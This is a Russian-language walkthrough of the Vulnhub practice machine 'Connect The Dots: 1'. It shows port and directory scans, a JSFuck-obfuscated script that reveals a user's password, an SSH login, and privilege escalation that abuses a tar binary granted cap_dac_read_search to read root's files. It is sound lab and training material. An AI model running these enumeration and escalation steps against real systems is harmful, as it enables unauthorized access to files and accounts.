# Connect The Dots: 1
## Vulnhub machine

- Название: Connect The Dots: 1  
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Beginner-Intermediate
- Дата релиза: 21.10.19
- Оригинальное описание: 
>The machine is VirtualBox compatible but can be used in VMWare as well (not tested but it should work). The DHCP will assign an IP automatically. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively. Enjoy pwning it!  

## Write-up

```html
┌─[root@parrot]─[/home/user]
└──╼ #nmap -sC -sV 192.168.56.121
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-19 04:34 AKDT
Nmap scan report for 192.168.56.121
Host is up (0.00019s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Landing Page
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38237/udp   mountd
|   100005  1,2,3      40993/tcp6  mountd
|   100005  1,2,3      47465/udp6  mountd
|   100005  1,2,3      58635/tcp   mountd
|   100021  1,3,4      37329/tcp6  nlockmgr
|   100021  1,3,4      38769/tcp   nlockmgr
|   100021  1,3,4      40855/udp6  nlockmgr
|   100021  1,3,4      51429/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 08:00:27:B8:4F:A9 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
```

>Нет ssh порта, вероятнее всего пропустил при сканировании. Среди огромного количества директорий тоже ничего особенного.

```html
┌─[root@parrot]─[/home/user]
└──╼ #dirb http://192.168.56.121/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Apr 19 04:40:25 2020
URL_BASE: http://192.168.56.121/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.121/ ----
+ http://192.168.56.121/backups (CODE:200|SIZE:6301)                           
==> DIRECTORY: http://192.168.56.121/images/                                   
+ http://192.168.56.121/index.htm (CODE:200|SIZE:2186)                         
+ http://192.168.56.121/index.html (CODE:200|SIZE:1964)                        
==> DIRECTORY: http://192.168.56.121/javascript/                               
==> DIRECTORY: http://192.168.56.121/manual/                                   
+ http://192.168.56.121/server-status (CODE:403|SIZE:302)                      
                                                                               
---- Entering directory: http://192.168.56.121/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.56.121/javascript/ ----
                                                                               
---- Entering directory: http://192.168.56.121/manual/ ----
==> DIRECTORY: http://192.168.56.121/manual/da/                                
==> DIRECTORY: http://192.168.56.121/manual/de/                                
==> DIRECTORY: http://192.168.56.121/manual/en/                                
==> DIRECTORY: http://192.168.56.121/manual/es/                                
==> DIRECTORY: http://192.168.56.121/manual/fr/                                
==> DIRECTORY: http://192.168.56.121/manual/images/                            
+ http://192.168.56.121/manual/index.html (CODE:200|SIZE:626)                  
==> DIRECTORY: http://192.168.56.121/manual/ja/                                
==> DIRECTORY: http://192.168.56.121/manual/ko/                                
==> DIRECTORY: http://192.168.56.121/manual/style/                             
==> DIRECTORY: http://192.168.56.121/manual/tr/                                
==> DIRECTORY: http://192.168.56.121/manual/zh-cn/                             
                                                                               
---- Entering directory: http://192.168.56.121/manual/da/ ----
==> DIRECTORY: http://192.168.56.121/manual/da/developer/                      
==> DIRECTORY: http://192.168.56.121/manual/da/faq/                            
==> DIRECTORY: http://192.168.56.121/manual/da/howto/                          
+ http://192.168.56.121/manual/da/index.html (CODE:200|SIZE:9117)              
==> DIRECTORY: http://192.168.56.121/manual/da/misc/                           
==> DIRECTORY: http://192.168.56.121/manual/da/mod/                            
==> DIRECTORY: http://192.168.56.121/manual/da/programs/                       
==> DIRECTORY: http://192.168.56.121/manual/da/ssl/                            
                                                                               
---- Entering directory: http://192.168.56.121/manual/de/ ----
==> DIRECTORY: http://192.168.56.121/manual/de/developer/                      
==> DIRECTORY: http://192.168.56.121/manual/de/faq/                            
==> DIRECTORY: http://192.168.56.121/manual/de/howto/                          
+ http://192.168.56.121/manual/de/index.html (CODE:200|SIZE:9544)              
==> DIRECTORY: http://192.168.56.121/manual/de/misc/                           
==> DIRECTORY: http://192.168.56.121/manual/de/mod/                            
==> DIRECTORY: http://192.168.56.121/manual/de/programs/                       
==> DIRECTORY: http://192.168.56.121/manual/de/ssl/                            
                                                                               
---- Entering directory: http://192.168.56.121/manual/en/ ----
==> DIRECTORY: http://192.168.56.121/manual/en/developer/                      
==> DIRECTORY: http://192.168.56.121/manual/en/faq/                            
==> DIRECTORY: http://192.168.56.121/manual/en/howto/                          
+ http://192.168.56.121/manual/en/index.html (CODE:200|SIZE:9482)              
==> DIRECTORY: http://192.168.56.121/manual/en/misc/                           
==> DIRECTORY: http://192.168.56.121/manual/en/mod/                            
==> DIRECTORY: http://192.168.56.121/manual/en/programs/                       
==> DIRECTORY: http://192.168.56.121/manual/en/ssl/                            
                                                                               
---- Entering directory: http://192.168.56.121/manual/es/ ----
==> DIRECTORY: http://192.168.56.121/manual/es/developer/                      
==> DIRECTORY: http://192.168.56.121/manual/es/faq/                            
==> DIRECTORY: http://192.168.56.121/manual/es/howto/                          
+ http://192.168.56.121/manual/es/index.html (CODE:200|SIZE:9891)              
==> DIRECTORY: http://192.168.56.121/manual/es/misc/                           
==> DIRECTORY: http://192.168.56.121/manual/es/mod/                            
==> DIRECTORY: http://192.168.56.121/manual/es/programs/                       
==> DIRECTORY: http://192.168.56.121/manual/es/ssl/                            
                                                                               
---- Entering directory: http://192.168.56.121/manual/fr/ ----
==> DIRECTORY: http://192.168.56.121/manual/fr/developer/                      
==> DIRECTORY: http://192.168.56.121/manual/fr/faq/                            
==> DIRECTORY: http://192.168.56.121/manual/fr/howto/                          
+ http://192.168.56.121/manual/fr/index.html (CODE:200|SIZE:9844)              
==> DIRECTORY: http://192.168.56.121/manual/fr/misc/                           
==> DIRECTORY: http://192.168.56.121/manual/fr/mod/                            
==> DIRECTORY: http://192.168.56.121/manual/fr/programs/                       
==> DIRECTORY: http://192.168.56.121/manual/fr/ssl/                            
                                                                               
---- Entering directory: http://192.168.56.121/manual/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.56.121/manual/ja/ ----
==> DIRECTORY: http://192.168.56.121/manual/ja/developer/                      
==> DIRECTORY: http://192.168.56.121/manual/ja/faq/                            
==> DIRECTORY: http://192.168.56.121/manual/ja/howto/                          
+ http://192.168.56.121/manual/ja/index.html (CODE:200|SIZE:9935)              
==> DIRECTORY: http://192.168.56.121/manual/ja/misc/                           
==> DIRECTORY: http://192.168.56.121/manual/ja/mod/                            
==> DIRECTORY: http://192.168.56.121/manual/ja/programs/                       
==> DIRECTORY: http://192.168.56.121/manual/ja/ssl/                            
                                                                               
---- Entering directory: http://192.168.56.121/manual/ko/ ----
==> DIRECTORY: http://192.168.56.121/manual/ko/developer/                      
==> DIRECTORY: http://192.168.56.121/manual/ko/faq/                            
==> DIRECTORY: http://192.168.56.121/manual/ko/howto/                          
+ http://192.168.56.121/manual/ko/index.html (CODE:200|SIZE:8585)              
==> DIRECTORY: http://192.168.56.121/manual/ko/misc/                           
==> DIRECTORY: http://192.168.56.121/manual/ko/mod/                            
==> DIRECTORY: http://192.168.56.121/manual/ko/programs/                       
==> DIRECTORY: http://192.168.56.121/manual/ko/ssl/                            
                                                                               
---- Entering directory: http://192.168.56.121/manual/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.56.121/manual/tr/ ----
==> DIRECTORY: http://192.168.56.121/manual/tr/developer/                      
==> DIRECTORY: http://192.168.56.121/manual/tr/faq/                            
==> DIRECTORY: http://192.168.56.121/manual/tr/howto/                          
+ http://192.168.56.121/manual/tr/index.html (CODE:200|SIZE:9714)              
==> DIRECTORY: http://192.168.56.121/manual/tr/misc/                           
==> DIRECTORY: http://192.168.56.121/manual/tr/mod/                            
==> DIRECTORY: http://192.168.56.121/manual/tr/programs/                       
==> DIRECTORY: http://192.168.56.121/manual/tr/ssl/                            
                                                                               
---- Entering directory: http://192.168.56.121/manual/zh-cn/ ----
==> DIRECTORY: http://192.168.56.121/manual/zh-cn/developer/                   
==> DIRECTORY: http://192.168.56.121/manual/zh-cn/faq/                         
==> DIRECTORY: http://192.168.56.121/manual/zh-cn/howto/                       
+ http://192.168.56.121/manual/zh-cn/index.html (CODE:200|SIZE:9211)           
==> DIRECTORY: http://192.168.56.121/manual/zh-cn/misc/                        
==> DIRECTORY: http://192.168.56.121/manual/zh-cn/mod/                         
==> DIRECTORY: http://192.168.56.121/manual/zh-cn/programs/                    
==> DIRECTORY: http://192.168.56.121/manual/zh-cn/ssl/
```

>Обратившись к исходнику главной страницы, можно найти закомментированные строки, в которых упоминается директория /mysite и, видимо, юзер norris.

>view-source:http://192.168.56.121/index.htm

>Среди прочих файлов, в /mysite лежал файл bootstrap.min.cs

```html
var a = "Loading..."
var b1 = "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+"
var b2 = "[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]"
var b3 = ")[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]"
var b4 = "+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])"
```

>Некий скрипт, транслированный в JSfuck. Попробуем его выполнить с помощью -- http://www.jsfuck.com/ Как выяснилось, чтобы скрипт выполнился корректно, нужно удалить все переменные и кавычки, оставив только JSfuck. Логично.
>Если ошибки не допущены, выскочит алерт, со следующей информацией:

```html
You're smart enough to understand me. Here's your secret, TryToGuessThisNorris@2k19
```

>Это явно пароль юзера "norris", придется искать ssh порт.

```html
┌─[✗]─[root@parrot]─[/home/user]
└──╼ #nmap -A -p- 192.168.56.121
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-19 05:07 AKDT
Nmap scan report for 192.168.56.121
Host is up (0.00074s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 2.0.8 or later
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Landing Page
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38237/udp   mountd
|   100005  1,2,3      40993/tcp6  mountd
|   100005  1,2,3      47465/udp6  mountd
|   100005  1,2,3      58635/tcp   mountd
|   100021  1,3,4      37329/tcp6  nlockmgr
|   100021  1,3,4      38769/tcp   nlockmgr
|   100021  1,3,4      40855/udp6  nlockmgr
|   100021  1,3,4      51429/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
7822/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA)
|   256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA)
|_  256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519)
38769/tcp open  nlockmgr 1-4 (RPC #100021)
45263/tcp open  mountd   1-3 (RPC #100005)
46263/tcp open  mountd   1-3 (RPC #100005)
58635/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:B8:4F:A9 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 192.168.56.121

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.89 seconds
```

>Входим как norris с указанием порта:

```html
┌─[root@parrot]─[/home/user]
└──╼ #ssh norris@192.168.56.121 -p 7822
The authenticity of host '[192.168.56.121]:7822 ([192.168.56.121]:7822)' can't be established.
ECDSA key fingerprint is SHA256:JK6+YY5U5vuE7DXk+tJBZFRPsa+G7KOZ366/v9ipWSE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.56.121]:7822' (ECDSA) to the list of known hosts.
norris@192.168.56.121's password: 
Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

###
   #     #    #     #     #####     #      ##     #####     #    #    #   ####
   #     ##   #     #       #       #     #  #      #       #    ##   #  #    #
   #     # #  #     #       #       #    #    #     #       #    # #  #  #
   #     #  # #     #       #       #    ######     #       #    #  # #  #  ###
   #     #   ##     #       #       #    #    #     #       #    #   ##  #    #
  ###    #    #     #       #       #    #    #     #       #    #    #   ####

norris@sirrom:~$ ls
ftp  user.txt
norris@sirrom:~$ cat user.txt
2c2836a138c0e7f7529aa0**********
```

>Берем флаг юзера и переходим к рут.

```html
norris@sirrom:/var/www/html$ ls
backups       bootstrap.bundle.min.js  hits.txt  index.htm   jquery.slim.min.js  mysite
backups.html  bootstrap.min.css        images    index.html  landing.css         secretfile
norris@sirrom:/var/www/html$ cat secretfile
I see you're here for the password. Holy Moly! Battery is dying !! Mentioning below for reference.
```

```html
norris@sirrom:~/ftp/files$ ls -la
total 972
drwxr-xr-x 2 norris norris    4096 Oct 11  2019 .
dr-xr-xr-x 3 nobody nogroup   4096 Oct 11  2019 ..
-r-------- 1 norris norris    6301 Oct 11  2019 backups.bak
-r-------- 1 norris norris   39610 Oct 11  2019 game.jpg.bak
-r-------- 1 norris norris      29 Oct 11  2019 hits.txt.bak
-r-------- 1 norris norris  932659 Oct 11  2019 m.gif.bak
```

```html
norris@sirrom:~$ sudo -l
[sudo] password for norris: 
Sorry, user norris may not run sudo on sirrom.
```

```html
norris@sirrom:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/sbin/mount.nfs
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/bwrap
/usr/bin/mount
/usr/bin/su
/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/chsh
/usr/bin/sudo
```

>После долгого и бессмысленного поиска, я подсмотрел решение этого CTF, среди прочих был интересный способ, который я решил попробовать:
>Ссылка на источник -- https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/

```html
norris@sirrom:~/ftp/files$ /sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep
```

```html
Среди прочего, мы имеем доступ к возможности создания архивов. Заархивируем папку root в которой лежит необходимый нам флаг.
```

```html
norris@sirrom:~/ftp/files$ /usr/bin/tar -cvf root_flag.tar /root/root.txt
/usr/bin/tar: Removing leading `/' from member names
/root/root.txt

norris@sirrom:~/ftp/files$ ls
backups.bak  game.jpg.bak  hits.txt.bak  m.gif.bak root_flag.tar
```

>Теперь извлечем его в текущей директории и заберем флаг.

```html
norris@sirrom:~/ftp/files$ tar -xf root_flag.tar
norris@sirrom:~/ftp/files$ ls
backups.bak  game.jpg.bak  hits.txt.bak  m.gif.bak  root  root_flag.tar
norris@sirrom:~/ftp/files$ cd root
norris@sirrom:~/ftp/files/root$ ls
root.txt
norris@sirrom:~/ftp/files/root$ cat root.txt
8fc9376d961670ca10be27**********
```
